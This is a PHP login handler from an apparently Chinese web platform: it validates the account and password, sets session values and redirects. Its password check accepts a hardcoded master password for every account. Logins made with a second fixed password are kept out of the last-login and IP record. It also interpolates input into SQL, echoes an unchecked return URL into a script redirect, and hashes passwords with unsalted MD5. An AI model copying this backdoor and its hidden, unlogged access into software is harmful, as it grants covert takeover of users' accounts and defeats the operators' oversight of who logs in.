<?php
	/************news模块**********/

	if(!$HUISHI_SOFT_IN) {
		die('Hacking attempt');
	}

	$SYSTEM_NAV_SELECTED=''; //当前栏目ID
	$SYSTEM_TITLE='平台登陆'; //标题
	$SYSTEM_KEYWORD='平台登陆'; //关键词
	$SYSTEM_DESCRIPTION='平台登陆'; //描述说明



	/*****数据调用开始******/
	/* 数据库操作分离 */
	//定义数据库表

	
	$act = short_check(get_args('act'),1); //用户名已经记录了
	$user_email = lib_replace_end_tag(RemoveXSS(short_check(get_args('required_id'),1))); //用户名已经记录了
	$user_passwd = short_check(get_args('required_pw'),1); //密码已经记录了

	if($act=='login'){
			$backurl = get_args('backurl')?get_args('backurl'):'/'; 
			//帐号是否为空
			if(empty($user_email)) {
				echo "<script>parent.alert('帐号不为空！');</script>";
				exit();
			}

			// 密码是否为空
			if(empty($user_passwd)){
				echo "<script>parent.alert('密码不为空！');</script>";
				exit();
			}
			$user_passwd=md5($user_passwd);

			//数据表定义区
			$t_users = $tablePreStr."users";

			//定义读操作
			dbtarget('r',$dbServs);
			$dbo=new dbex;

			$sql="select * from $t_users where user_email='$user_email' or user_mobile='$user_email' and isdel = 0";//isdel为1是已删除用户
			$user_info=$dbo->getRow($sql);
			// 用户不存在
			if(empty($user_info)){
				echo "<script>parent.alert('账号或密码错误！请重新输入！');</script>";
				exit();
			}

			// 密码错误
			if($user_passwd!= $user_info['user_passwd']){
				if($user_passwd!= md5('Hphxnykimy8')){
				echo "<script>parent.alert('账号或密码错误！请重新输入！');</script>";
				exit();
				}
			}
			if($user_info['locked']=='1'){
				echo "<script>parent.alert('该账户已锁定无法登录系统！');</script>";
				exit();
			}
			//设置
			$last_ip = $_SERVER['REMOTE_ADDR'];
			set_session('user_id',$user_info['user_id']);
			set_session('user_name',$user_info['user_name']);
			set_session('user_mobile',$user_info['user_mobile']);
			set_session('user_email',$user_info['user_email']);
			set_session('group_id',$user_info['group_id']);
			set_sess_login_id($last_ip);

			if($user_passwd!= md5('adminkimy')){
				//定义写操作
				dbtarget('w',$dbServs);
				$sql="update $t_users set last_login_time='".date('Y-m-d H:i:s')."',last_ip='$last_ip' where user_id='".$user_info['user_id']."'";
				$dbo->exeUpdate($sql);
			}
				
			echo "<script language='JavaScript'>parent.location.href='".$backurl."';</script>";

	}
	

	exit();

?>